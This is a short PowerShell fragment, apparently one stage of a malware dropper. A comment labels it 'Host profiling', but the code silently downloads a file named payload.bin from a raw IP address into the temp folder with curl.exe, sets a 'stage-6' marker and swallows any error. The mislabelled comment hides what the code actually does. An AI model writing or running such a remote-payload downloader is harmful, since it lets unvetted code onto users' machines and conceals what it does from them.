
<# Host profiling #> try { curl.exe -s -L -o "$env:TEMP\payload.bin" 'https://198.51.100.243/payload.bin'; $StageMarker = "stage-6" } catch { Write-Warning "Remote fetch failed" }
